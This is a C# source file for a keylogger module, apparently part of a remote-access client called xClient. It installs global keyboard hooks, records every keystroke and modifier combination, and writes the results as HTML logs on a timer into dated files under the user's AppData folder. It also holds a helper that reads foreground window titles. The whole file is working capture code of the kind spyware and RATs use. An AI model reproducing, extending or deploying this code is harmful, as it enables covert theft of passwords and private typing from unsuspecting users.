using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace xClient.Core.Keylogger
{
    /// <summary>
    /// Ties together the logic used to log keyboard input with the
    /// logic used to manipulate the output
    /// </summary>
    public class Logger : IDisposable
    {
        public static Logger Instance;
        private bool disposed = false;

        private StringBuilder _logFileBuffer;
        private string _hWndTitle;
        private string _hWndLastTitle;

        private readonly string _filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                                            "\\Logs\\";

        private readonly System.Timers.Timer _timerFlush;

        private List<Keys> PressedKeys = new List<Keys>();

        private IKeyboardMouseEvents m_Events;

        /// <summary>
        /// Creates the logging class that provides keylogging functionality.hello?
        /// </summary>
        public Logger(double flushInterval)
        {
            Instance = this;
            _hWndLastTitle = string.Empty;

            WriteFile();

            this._logFileBuffer = new StringBuilder();

            this._timerFlush = new System.Timers.Timer { Interval = flushInterval };
            this._timerFlush.Elapsed += this.timerFlush_Elapsed;

            Unsubscribe();
            Subscribe(Hook.GlobalEvents());

            _timerFlush.Enabled = true;
            _timerFlush.Start();

            Application.Run();
        }

        ~Logger()
        {
            // If Dispose() is called, we won't reach here and performance will not be
            // hit. This is here if Dispose() did not get called when it should have.
            // It is a safe-guard because we want to make sure we unsubscribe from these
            // things or the client may not be able to get keystrokes/mouse clicks to any
            // other application (including Windows).
            Dispose(true);
        }

        public void Dispose()
        {
            Dispose(true);

            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!disposed)
            {
                if (disposing)
                {
                    if (_timerFlush != null)
                    {
                        _timerFlush.Dispose();
                    }

                    Unsubscribe();

                    disposed = true;
                }
            }
        }

        private void Subscribe(IKeyboardMouseEvents events)
        {
            m_Events = events;
            m_Events.KeyDown += OnKeyDown;
            m_Events.KeyUp += OnKeyUp;
            m_Events.KeyPress += Logger_KeyPress;

            // To-Do: Log these in a readable manner... Perhaps the location etc.
            //m_Events.MouseDown += OnMouseDown;
            //m_Events.MouseUp += OnMouseUp;
            //m_Events.MouseClick += OnMouseClick;
            //m_Events.MouseDoubleClick += OnMouseDoubleClick;

            //m_Events.MouseMove += HookManager_MouseMove;
            //m_Events.MouseWheel += HookManager_MouseWheel;

            //m_Events.MouseDownExt += HookManager_Supress;
        }

        private void Unsubscribe()
        {
            if (m_Events == null) return;

            m_Events.KeyDown -= OnKeyDown;
            m_Events.KeyUp -= OnKeyUp;
            m_Events.KeyPress -= Logger_KeyPress;

            // To-Do: Log these in a readable manner... Perhaps the location etc.
            //m_Events.MouseDown -= OnMouseDown;
            //m_Events.MouseUp -= OnMouseUp;
            //m_Events.MouseClick -= OnMouseClick;
            //m_Events.MouseDoubleClick -= OnMouseDoubleClick;

            //m_Events.MouseMove -= HookManager_MouseMove;
            //m_Events.MouseWheel -= HookManager_MouseWheel;

            //m_Events.MouseDownExt -= HookManager_Supress;
            m_Events.Dispose();
        }

        private void OnKeyDown(object sender, KeyEventArgs e) //Called first
        {
            if (PressedKeys.Contains(Keys.LControlKey) //if modifier keys are still down, they will be highlighted, including any other key pressed
                || PressedKeys.Contains(Keys.RControlKey)
                || PressedKeys.Contains(Keys.LMenu)
                || PressedKeys.Contains(Keys.RMenu)
                || PressedKeys.Contains(Keys.LWin)
                || PressedKeys.Contains(Keys.RWin))
            {
                if (!PressedKeys.Contains(e.KeyCode)) //prevent multiple keypresses holding down a key
                    PressedKeys.Add(e.KeyCode);
            }
            else if ((e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z) //exclude keys here we don't want to log and return, KeyPress event can handle these if it is a character value
                || (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.Divide)
                || (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
                || (e.KeyCode >= Keys.Oem1 && e.KeyCode <= Keys.OemClear
                || (e.KeyCode >= Keys.LShiftKey && e.KeyCode <= Keys.RShiftKey)
                || (e.KeyCode == Keys.CapsLock)))
            {
                return;
            }
            else if (e.KeyCode == Keys.Enter)
            {
                _logFileBuffer.Append("<font color=\"0000FF\">(ENTER)</font><br>"); //this could be where the KeyloggerKeys enum would be handy
            }
            else if (e.KeyCode == Keys.Space)
            {
                _logFileBuffer.Append(" ");
            }
            else if (e.KeyCode == Keys.Back)
            {
                _logFileBuffer.Append("<font color=\"0000FF\">(BACK)</font>");
            }
            else if (e.KeyCode == Keys.Delete)
            {
                _logFileBuffer.Append("<font color=\"0000FF\">(DEL)</font>");
            }
            else if (e.KeyCode >= Keys.Left && e.KeyCode <= Keys.Down)
            {
                _logFileBuffer.Append("<font color=\"0000FF\">(" + e.KeyCode.ToString() + ")</font>");
            }
            else
                if (!PressedKeys.Contains(e.KeyCode)) //prevent multiple keypresses holding down a key
                    PressedKeys.Add(e.KeyCode);
        }

        private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
        {
            //This method should be used to process all of our unicode characters
            _logFileBuffer.Append(e.KeyChar);
        }

        private void OnKeyUp(object sender, KeyEventArgs e) //Called third
        {
            _logFileBuffer.Append(HighlightSpecialKeys(PressedKeys.ToArray()));
        }

        private string HighlightSpecialKeys(Keys[] _names)
        {
            if (_names.Length < 1) return string.Empty;

            string[] names = new string[_names.Length];
            for (int i = 0; i < _names.Length; i++)
            {
                names[i] = _names[i].ToString();
            }

            if (PressedKeys.Contains(Keys.LControlKey)
                || PressedKeys.Contains(Keys.RControlKey)
                || PressedKeys.Contains(Keys.LMenu)
                || PressedKeys.Contains(Keys.RMenu)
                || PressedKeys.Contains(Keys.LWin)
                || PressedKeys.Contains(Keys.RWin))
            {
                StringBuilder specialKeys = new StringBuilder();

                int ValidSpecialKeys = 0;
                for (int i = 0; i < names.Length; i++)
                {
                    PressedKeys.Remove(_names[i]);
                    if (!string.IsNullOrEmpty(names[i]))
                    {
                        if (ValidSpecialKeys == 0)
                        {
                            specialKeys.AppendFormat("<font color=\"0000FF\">([{0}] ", names[i]);
                        }
                        else
                        {
                            specialKeys.AppendFormat("+ [{0}]", names[i]);
                        }

                        ValidSpecialKeys++;
                    }
                }

                // If there are items in the special keys string builder, give it an ending
                // font tag and some trailing white-space.
                if (ValidSpecialKeys > 0)
                {
                    specialKeys.Append(")</font> ");
                }

                return specialKeys.ToString();
            }
            else
            {
                StringBuilder normalKeys = new StringBuilder();

                for (int i = 0; i < names.Length; i++)
                {
                    PressedKeys.Remove(_names[i]);
                    if (!string.IsNullOrEmpty(names[i]))
                    {
                        normalKeys.Append(names[i]);
                    }
                }

                return normalKeys.ToString();
            }
        }

        private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (_logFileBuffer.Length > 0)
                WriteFile();
        }

        private void WriteFile()
        {
            bool writeHeader = false;

            string fileName = _filePath + DateTime.Now.ToString("MM-dd-yyyy");

            try
            {
                if (!Directory.Exists(_filePath))
                    Directory.CreateDirectory(_filePath);

                if (!File.Exists(fileName))
                    writeHeader = true;

                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write))
                {
                    using (StreamWriter sw = new StreamWriter(fileStream))
                    {
                        try
                        {
                            if (writeHeader)
                            {
                                sw.Write("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                                         DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br>");

                                if (_logFileBuffer.Length > 0)
                                    sw.Write(_logFileBuffer);

                                _hWndLastTitle = string.Empty;
                            }
                            else
                                sw.Write(_logFileBuffer);
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch
            {
            }

            _logFileBuffer = new StringBuilder();
        }

        private string GetActiveWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            WinApi.ThreadNativeMethods.GetWindowText(WinApi.ThreadNativeMethods.GetForegroundWindow(), sbTitle, sbTitle.Capacity);

            string title = sbTitle.ToString();

            return title != string.Empty ? title : null;
        }
    }
}